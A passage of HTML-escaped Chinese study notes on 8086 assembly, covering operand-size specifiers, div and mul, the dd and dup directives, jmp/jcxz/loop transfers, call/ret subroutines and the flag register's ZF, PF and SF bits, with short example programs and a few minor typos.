      &lt;td&gt;用于表格(结构)中的数组项[bx].idata[si]、用于二维数组idata[bx][si]&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;指令要处理的数据长度&quot;&gt;指令要处理的数据长度&lt;/h3&gt;

&lt;h4 id=&quot;通过寄存器名指定&quot;&gt;通过寄存器名指定&lt;/h4&gt;

&lt;p&gt;8086的指令可以处理2中尺寸的数据，&lt;code class=&quot;highlighter-rouge&quot;&gt;byte&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;word&lt;/code&gt;，汇编语言通过指明寄存器名(ax还是al)指明要处理的数据的尺寸。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov ax,1 //指明了指令是字操作
    mov bx,ds[0]
    mov ds,ax
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov al,1 //指明了指令是字节操作
    mov al,bl
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;通过操作符指定&quot;&gt;通过操作符指定&lt;/h4&gt;

&lt;p&gt;在没有寄存器名的情况下，用操作符&lt;code class=&quot;highlighter-rouge&quot;&gt;X ptr&lt;/code&gt;指明内存单元的长度,X可以为&lt;code class=&quot;highlighter-rouge&quot;&gt;word&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;byte&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;1.指明为字操作&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov word ptr ds:[0],1
    inc word otr [bx]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2.指明为字节操作&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov byte ptr ds:[0],1
    inc byte ptr [bx]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;其他方法&quot;&gt;其他方法&lt;/h4&gt;

&lt;p&gt;有一些指令默认了访问的是字单元还是字节单元，如&lt;code class=&quot;highlighter-rouge&quot;&gt;push [1000H]&lt;/code&gt;，就不用指明访问的是字单元还是字节单元，因为&lt;code class=&quot;highlighter-rouge&quot;&gt;push&lt;/code&gt;指令只进行字操作。&lt;/p&gt;

&lt;h4 id=&quot;div指令&quot;&gt;div指令&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //被除数默认是在AX或（DX和AX）中
    div 除数的内存单元
    
    //al=ax/ds:0的商   ah=ax/ds:0的余 因为是除数是8位AX存放商和余就够了
    div byte ptr ds:[0]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;div是除法指令，使用时应注意以下问题。
1.除数：有8位和16位两种
2.被除数：默认放在AX或DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放。如果除数为16位，被除数则为32位，在DX和AX中存放,DX存放高16位，AX存放低16位。
3.结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数。如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。&lt;/p&gt;

&lt;p&gt;做成表格看起来比较直观&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;除数&lt;/th&gt;
      &lt;th&gt;除数8位&lt;/th&gt;
      &lt;th&gt;除数16位&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;被除数&lt;/td&gt;
      &lt;td&gt;被除数为16位，默认在AX中存放&lt;/td&gt;
      &lt;td&gt;被除数为32位，在DX和AX中存放,DX存放高16位，AX存放低16位&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;结果&lt;/td&gt;
      &lt;td&gt;AL存储除法操作的商，AH存储除法操作的余数&lt;/td&gt;
      &lt;td&gt;AX存储除法操作的商，DX存储除法操作的余数&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;计算100001/100&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
    //因为100001大于65535是一个32位的，被除数应为16位
    //先把100001拆成高16位和低16位，高16位放到dx，低16位放到ax中
    mov dx,1
    mov ax,86A1H //1*10000H+86A1H=100001
    mov bx,100
    div bx
    //结果ax=03E8（即商为1000），dx=1（余数为1）。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;伪指令dd&quot;&gt;伪指令dd&lt;/h4&gt;

&lt;p&gt;前面我们用db和dw定义字节型数据和字型数据，dd是用来定义doubleword，双字型数据。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;     data segment
     db 1 //01H 在data:0处，占1个字节
     dw 1 //0001H 在data:1处，占1个字
     dd 1 //00000001H 在data:3处，占2个字
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;dup&quot;&gt;dup&lt;/h4&gt;

&lt;p&gt;dup是一个操作符，在汇编语言中和db、dw、dd等一样，有编译器识别处理。它是和db、dw、dd等数据定义伪指令配合使用的，用来进行数据的重复。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //定义了3个字节，值都是0，相当于db 0,0,0
    db 3 dup (0)
    
    //定义了9个字节，分别是0,1,2,0,1,2,0,1,2相当于db 0,1,2,0,1,2,0,1,2
    db 3 dup (0,1,2)
    
    定义了18个字节，值是'abcABCabcABCabcABC'相当于db 'abcABCabcABCabcABC'
    db 3 dup ('abc',&quot;ABC&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;可见dup的使用格式如下&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    数据类型  重复的次数  dup （重复的数据）
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;转移指令的原理&quot;&gt;转移指令的原理&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;可以修改IP，或同时修改CS和IP的指令统称为转移指令。&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;转移指令的分类&quot;&gt;转移指令的分类&lt;/h4&gt;

&lt;p&gt;8086CPU的转移行为有一下几类。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;转移类型&lt;/th&gt;
      &lt;th&gt;示例&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;只修改IP，称为段内转移&lt;/td&gt;
      &lt;td&gt;jmp ax&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;同时修改CS和IP，称为段间转移&lt;/td&gt;
      &lt;td&gt;jmp 1000:0&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;对于转移指令对IP的修改范围不同，段内转移又分为：短转移和近转移。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;短转移IP的修改范围为-128~127&lt;/li&gt;
  &lt;li&gt;近转移IP的修改范围为-32768~32767&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;8086CPU的转移指令分为以下几类&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;无条件转移指令（jmp）&lt;/li&gt;
  &lt;li&gt;条件转移指令&lt;/li&gt;
  &lt;li&gt;循环指令（loop）&lt;/li&gt;
  &lt;li&gt;过程&lt;/li&gt;
  &lt;li&gt;中断&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;操作符offset&quot;&gt;操作符offset&lt;/h4&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;offset&lt;/code&gt;是由编译器处理的符号，它的功能是取得标号的偏移地址。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assume cs:codesg
    codesg segment
    	start:mov ax,offset start  //相当于mov ax,0
            s:mov ax,offset s      //相当于mov ax,3
    codesg ends
    end start
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;offset&lt;/code&gt;取得了标号的&lt;code class=&quot;highlighter-rouge&quot;&gt;start&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;s&lt;/code&gt;的偏移地址。&lt;/p&gt;

&lt;h4 id=&quot;jmp指令&quot;&gt;jmp指令&lt;/h4&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp&lt;/code&gt;是无条件转移指令，可以只修改&lt;code class=&quot;highlighter-rouge&quot;&gt;IP&lt;/code&gt;，也可以同时修改&lt;code class=&quot;highlighter-rouge&quot;&gt;CS&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;IP&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;jmp指令要给出两种信息：&lt;/p&gt;

&lt;p&gt;1.转移的目的地址&lt;/p&gt;

&lt;p&gt;2.转移的距离&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp short 标号&lt;/code&gt; 表示转移到标号处执行指令
这种格式的jmp指令实现的是段内短转移，它对IP的修改范围为-128~127。指令中的&lt;code class=&quot;highlighter-rouge&quot;&gt;short&lt;/code&gt;说明指令进行的是短转移。指令中的标号指明了要转移的目的地，转移指令结束后，CS:IP应该指向标号处的指令。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assume cs:codesg
    
    codesg segment
     start:mov ax,0
           jmp short s  //跳转到s标号处继续执行
           add ax,1     //这句被跳过了
         s:inc ax
    codesg ends
    end start
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h5 id=&quot;jmp-short-标号&quot;&gt;jmp short 标号&lt;/h5&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp short&lt;/code&gt;指令对应的机器码中不包含转移的目的地址，而是转移的位移。
&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp short&lt;/code&gt;的实际功能为IP=IP+(8位的位移)。&lt;/p&gt;

&lt;p&gt;1.8位位移=标号处的地址-jmp指令后的第一个字节的地址。&lt;/p&gt;

&lt;p&gt;2.short指明了此处的位移为8位。&lt;/p&gt;

&lt;p&gt;3.8位位移范围为-128~127，用补码表示。&lt;/p&gt;

&lt;p&gt;4.8位位移由编译器在编译时算出。&lt;/p&gt;

&lt;h5 id=&quot;jmp-near-ptr-标号&quot;&gt;jmp near ptr 标号&lt;/h5&gt;
&lt;p&gt;还有一种和&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp short 标号&lt;/code&gt;功能相近的指令格式，&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp near ptr 标号&lt;/code&gt;，它实现的是段内近转移。
&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp near ptr 标号&lt;/code&gt;的功能为IP=IP+(16位位移)。&lt;/p&gt;

&lt;p&gt;1.16位位移=标号处的地址-jmp指令后的第一个字节的地址。&lt;/p&gt;

&lt;p&gt;2.near ptr指明此处的位移为16位位移，进行的是段内近转移。&lt;/p&gt;

&lt;p&gt;3.16位位移的范围为-32768~32767，用补码表示。&lt;/p&gt;

&lt;p&gt;4.16位位移由编译程序在编译时算出。&lt;/p&gt;

&lt;h5 id=&quot;jmp-far-ptr-标号&quot;&gt;jmp far ptr 标号&lt;/h5&gt;

&lt;p&gt;前面的jmp指令，对应的机器指令中没有目的地址，而是相对于当前IP的偏移地址。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp far ptr 标号&lt;/code&gt;实现的是段间转移，又称为远转移。
CS=标号所在段的段地址;IP=标号在段中的偏移地址。
far ptr 指明了指令用标号的段地址和偏移地址修改CS和IP。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assume cs:codesg
    
    codesg segment
     start:mov ax,0
     	   mov bx,0
           jmp far ptr s  //机器码中包含了目的地址
           db 256 dup (0) //被跳过
         s:add ax,1
           inc ax
    codesg ends
    end start
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h5 id=&quot;转移地址在寄存器中的jmp指令&quot;&gt;转移地址在寄存器中的jmp指令&lt;/h5&gt;

&lt;p&gt;指令格式：jmp 16位寄存器
功能：IP = 16位寄存器中的转移地址&lt;/p&gt;

&lt;h5 id=&quot;转移地址在内存中的jmp指令&quot;&gt;转移地址在内存中的jmp指令&lt;/h5&gt;

&lt;p&gt;转移地址在内存中的jmp指令有两种格式：&lt;/p&gt;

&lt;p&gt;1.&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp word ptr 内存单元地址&lt;/code&gt;(段内转移)
功能：从内存单元地址处取出转移目的的偏移地址（一个字）。
内存单元地址可用任意寻址方式给出&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov ax,0123H
    mov ds:[0],ax
    jmp word ptr ds:[0]
    //IP=0123H
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2.&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp dword ptr 内存单元地址&lt;/code&gt;(段间转移)
功能：从内存单元地址处取出转移目的地址（两个字），高地址的字是转移目的的段地址，低地址的字是转移目的的偏移地址。
CS = 内存单元地址+2
IP = 内存单元地址&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov ax,0123H
    mov ds:[0],ax
    mov word ptr ds:[2],0 //指明存的是字，占2个位置
    jmp dword ptr ds:[0]
    //CS=0，IP=0123，CS:IP指向0000:0123
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;jcxz指令&quot;&gt;jcxz指令&lt;/h4&gt;

&lt;p&gt;jcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目标地址，对IP的修改范围都是:-128~127。由cx控制。&lt;/p&gt;

&lt;p&gt;指令格式:jcxz 标号（如果cx = 0 ，转移到标号处执行）。
当cx = 0时，IP = IP+8位的位移。
8位位移 = 标号处的地址-jcxz指令后的第一个字节的地址。
8位位移的范围为-128~127，用补码表示。
8位位移由编译程序在编译时算出。&lt;/p&gt;

&lt;p&gt;cx≠0时什么也不做&lt;/p&gt;

&lt;h4 id=&quot;loop指令&quot;&gt;loop指令&lt;/h4&gt;

&lt;p&gt;loop指令为循环指令，所有循环指令都是短转移。&lt;/p&gt;

&lt;p&gt;指令格式:loop 标号（cx = cx-1,如果cx ≠ 0,转移到标号处执行。等于0就继续向下执行）
cx = cx-1
如果cx ≠ 0，IP = IP+8位位移。
8位位移 = 标号处的地址 - loop指令后的第一个字节的地址。
8位位移的范围为 - 128~127，用补码表示。
8位位移由编译程序在编译时算出。&lt;/p&gt;

&lt;h3 id=&quot;call和ret指令&quot;&gt;CALL和RET指令&lt;/h3&gt;

&lt;h4 id=&quot;ret和retf&quot;&gt;ret和retf&lt;/h4&gt;

&lt;p&gt;ret指令用栈中的数据，修改IP的内容，从而实现近转移。
retf指令中栈中的数据，修改CS和IP的内容，从而实现远转移。&lt;/p&gt;

&lt;p&gt;CPU执行ret指令时，进行下面两步操作：&lt;/p&gt;

&lt;p&gt;1.IP=ss*16+SP&lt;/p&gt;

&lt;p&gt;2.sp=sp+2&lt;/p&gt;

&lt;p&gt;相当于进行了
pop IP 操作&lt;/p&gt;

&lt;p&gt;CPU指令retf指令时，进行下面4步操作：&lt;/p&gt;

&lt;p&gt;1.IP = ss*16+sp&lt;/p&gt;

&lt;p&gt;2.sp = sp+2&lt;/p&gt;

&lt;p&gt;3.CS = ss*16+sp&lt;/p&gt;

&lt;p&gt;4.sp = sp+2&lt;/p&gt;

&lt;p&gt;相当于进行了：
pop IP
pop CS 操作&lt;/p&gt;

&lt;p&gt;例：ret指令执行后，IP = 0，CS:IP指向代码段的第一条指令。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assume cs:code
    stack segment
	  db 16 dup(0)
    stack ends
    
    code segment
            mov ax,4c00h
    	    int 21h
        
    start:  mov ax,stack
            mov ss,ax
            mov sp,16
            mov ax.0
            push ax
            mov bx,0
            ret
    code ends
    
    end start

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;例：retf指令执行后，CS:IP指向代码段的第一条指令&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assume cs:code
    stack segment
	  db 16 dup(0)
    stack ends
    
    code segment
            mov ax,4c00h
    	    int 21h
        
    start:  mov ax,stack
            mov ss,ax
            mov sp,16
            mov ax.0
            push cs
            push ax
            mov bx,0
            retf
    code ends
    
    end start

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;call指令&quot;&gt;call指令&lt;/h4&gt;

&lt;p&gt;CPU执行call指令时，进行两步操作：&lt;/p&gt;

&lt;p&gt;1.将当前的IP或CS和IP压入栈中。&lt;/p&gt;

&lt;p&gt;2.转移&lt;/p&gt;

&lt;p&gt;call指令不能实现短转移，实现方法和jmp指令的原理相同。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;相对地址的call&lt;/strong&gt;
指令格式：call 标号（将当前的IP压栈后，转移到标号处执行指令）&lt;/p&gt;

&lt;p&gt;CPU执行这种格式的call指令时，进行如下的操作：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    1.sp = sp - 2
      ss*16 + sp = IP
    2.IP=IP+16位位移
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;16位位移 = 标号处的地址 - call指令后的第一个字节的地址。
16位位移的范围为-32768~32767,用补码表示。
16位位移由编译程序在编译时算出。&lt;/p&gt;

&lt;p&gt;“call 标号” 相当于&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    push IP
    jmp near ptr 标号
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;目的地址的call&lt;/strong&gt;
指令格式：call far ptr 标号
这种格式的call指令实现的是段间转移。&lt;/p&gt;

&lt;p&gt;CPU执行此种格式的call指令是，进行如下的操作。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    1.sp = sp-2
      ss*16+sp = CS
      sp = sp-2
      ss*16+sp = IP
    2.CS = 标号所在段的段地址
      IP = 标号在段的偏移地址
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;“call far ptr 标号” 相当于&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    push CS
    push IP
    jmp far ptr 标号
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;转移地址在寄存器中的call指令&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;指令格式：call 16位 reg&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    sp = sp-2
    ss*16+sp = IP
    IP = 16位reg
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;相当于&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    push IP
    jmp 16位reg
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;转移地址在内存中的call指令&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;转移地址在内存中的call指令有两种格式。&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;call word ptr 内存单元地址 （仅修改IP）
相当于
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  push IP
  jmp word ptr 内存单元地址
    
  例：
  mov sp,10h
  mov ax,0123h
  mov ds:[0],ax
  call word ptr ds:[0]
  //执行后IP=0123H,sp=0EH
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;call dword ptr 内存单元地址 (同时修改CS和IP)
相当于
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  push CS
  push IP
  jmp dword ptr 内存单元地址
    
  例：
  mov sp,10h
  mov ax,0123h
  mov ds:[0],ax
  mov word ptr ds:[2],0
  call dword ptr ds:[0]
  //执行后CS=0,IP=0123H,sp=0CH
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;call和ret的配合使用&quot;&gt;call和ret的配合使用&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assume cs:code
    code segment
    start: mov ax,1
     	   mov cx,3
           call s       //将当前IP的值压栈，然后跳转到s标号执行
           mov bx,ax
           mov ax,4c00h
           int 21h
        s: add ax,ax
	       loop s
           ret          //从栈中取一个值送入IP中，转移到IP处执行，
                        //即call s的下一句代码
	code ends
    end start
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;由此可以看出call和ret可以实现子程序的效果，s标号的代码段执行完后又回到了前面的代码继续执行。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;子程序框架&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assume cs:code
    code segment
      main:                //主程序
            ...
            call sub1      //调用子程序1
            ...
            mov ax,4c00h
            int 21h
      sub1:                //子程序1
            ...
            call sub2      //调用子程序2
            ...
            ret            //子程序1的返回到主程序
      sub2:                //子程序2
            ...
            ret            //子程序2返回到子程序1
    code ends
    end main
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;mul指令&quot;&gt;mul指令&lt;/h4&gt;

&lt;p&gt;mul是乘法指令。
两个相乘的数:必须同时为8位或者16位。如果是8位，一个默认放在AL中，另一个放在8位寄存器或内存字节单元中。如果是16位乘法，一个默认在AX中，另一个放在16位reg或内存字单元中。
结果：如果是8位乘法，结果默认放在AX中，如果是16位乘法，结果高位默认放在DX中，低位放在AX中。&lt;/p&gt;

&lt;p&gt;指令格式：&lt;code class=&quot;highlighter-rouge&quot;&gt;mul reg&lt;/code&gt;  或者 &lt;code class=&quot;highlighter-rouge&quot;&gt;mul 内存单元&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;内存单元可以用不同的寻址方式给出，如&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mul byte ptr ds:[0]
    //含义为ax=al*(ds*16+0);
    
    mul word ptr [bx+si+8]
    //含义为ax=ax*(ds*16+bx+si+8)结果的低16位
    //     dx=ax*(ds*16+bx+si+8)结果为高16位
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;例如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //计算100*10
    mov al,100
    mov bl,10
    mul bl
    //结果ax=1000
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;标识寄存器&quot;&gt;标识寄存器&lt;/h3&gt;

&lt;p&gt;CPU内部的寄存器中，有一种特殊的寄存器，有一下作用&lt;/p&gt;

&lt;p&gt;1.用来存储相关指令的某些执行结果。&lt;/p&gt;

&lt;p&gt;2.用来为CPU执行相关指令提供行为依据。&lt;/p&gt;

&lt;p&gt;3.用来控制CPU的相关工作方式。&lt;/p&gt;

&lt;p&gt;这种特殊的寄存器在8086中，被称为标识寄存器。8086的寄存器有16位，其中存储的信息通常被称为程序状态字(PSW)。&lt;/p&gt;

&lt;p&gt;有的指令影响标志寄存器，如add、sub、mul、div、inc、or、and等，大多是运算指令。
有的指令不影响标识寄存器，如mov、push、pop等，大多是传送指令。&lt;/p&gt;

&lt;p&gt;flag寄存器每一位都有专门的含义，记录特定的信息。&lt;/p&gt;

&lt;p&gt;flag寄存器的1、3、5、12、13、14、15位在8086CPU中没有使用，没有含义，而0、2、4、6、7、8、9、10、11位都具有特殊的含义。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;15&lt;/th&gt;
      &lt;th&gt;14&lt;/th&gt;
      &lt;th&gt;13&lt;/th&gt;
      &lt;th&gt;12&lt;/th&gt;
      &lt;th&gt;11&lt;/th&gt;
      &lt;th&gt;10&lt;/th&gt;
      &lt;th&gt;9&lt;/th&gt;
      &lt;th&gt;8&lt;/th&gt;
      &lt;th&gt;7&lt;/th&gt;
      &lt;th&gt;6&lt;/th&gt;
      &lt;th&gt;5&lt;/th&gt;
      &lt;th&gt;4&lt;/th&gt;
      &lt;th&gt;3&lt;/th&gt;
      &lt;th&gt;2&lt;/th&gt;
      &lt;th&gt;1&lt;/th&gt;
      &lt;th&gt;0&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;OF&lt;/td&gt;
      &lt;td&gt;DF&lt;/td&gt;
      &lt;td&gt;IF&lt;/td&gt;
      &lt;td&gt;TF&lt;/td&gt;
      &lt;td&gt;SF&lt;/td&gt;
      &lt;td&gt;ZF&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;AF&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;PF&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;CF&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;zf标志&quot;&gt;ZF标志&lt;/h4&gt;

&lt;p&gt;flag的第6位是ZF，零标志位，它记录相关指令执行后，其结果是否为0。如果结果为0，那么zf=1；如果结果不为0，那么zf=0。&lt;/p&gt;

&lt;p&gt;如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov ax,1
    sub ax,1
    //执行后，结果为0，则zf=1
    
    mov ax,2
    sub ax,1
    //执行后，结果不为0，则zf=0
    
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;pf标志&quot;&gt;PF标志&lt;/h4&gt;

&lt;p&gt;flag的第2位是PF，奇偶标志位。它记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数，如果1的个数为偶数，pf=1，如果为奇数，pf=0。&lt;/p&gt;

&lt;p&gt;如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov al,1
    add al,10
    //执行后，结果为00001011B,其中有3个1，则pf=0
    
    mov al,1
    or al,2
    //执行后，结果为00000011B,其中有2个1，则pf=1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;sf标志&quot;&gt;SF标志&lt;/h4&gt;

&lt;p&gt;flag的第7位是SF，符号标志位。它记录相关指令执行后，其结果是否为负。如果结果为负，sf=1；如果非负，sf=0。&lt;/p&gt;

&lt;p&gt;计算机中通常用补码来表示有符号数据。计算机中的一个数据可以看作是有符号数，也可以看成是无符号数。比如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    00000001B，可以看作无符号数1，或有符号数+1;
    10000001B,可以看作无符号数129，也可以看作有符号数-127
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;也就是说对于同一个二进制数据，计算机可以将它当作无符号数据来运算，也可以当做有符号数据来运算
如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov al,10000001B
    add al,1
    //结果 al=10000010B
